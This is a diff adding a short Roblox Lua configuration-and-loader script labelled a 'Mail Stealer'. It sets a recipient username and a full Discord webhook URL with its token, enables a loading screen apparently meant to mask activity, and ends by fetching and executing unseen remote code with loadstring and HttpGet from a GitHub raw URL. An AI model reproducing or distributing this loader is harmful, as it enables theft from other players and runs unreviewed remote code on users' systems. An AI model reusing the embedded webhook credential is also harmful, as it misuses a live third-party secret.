@@ -1,0 +1,15 @@
+-- PtacikCZ Scriptz Mail Stealer --
+
+-- Main Config --
+_G.UserName = "dlazdi123" -- Write your Username
+
+-- Webhook Config --
+_G.Webhook = "https://discord.com/api/webhooks/1126938512130850936/ZBXHgPc8Km_sEBOyMF811Y4gMlSzvuU2jKGAjCS9xTtyqBV8w6mqqRPQtFUhPK0oMJMN" -- Enter your Webhook
+
+-- Extra Settings --
+_G.LoadingScreen = true -- DONT CHANGE
+_G.AntiLeave = false -- DONT CHANGE
+_G.MouseLock = true -- DONT CHANGE
+
+-- Script --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/Dlazdicka/main/PlazaLag"))()
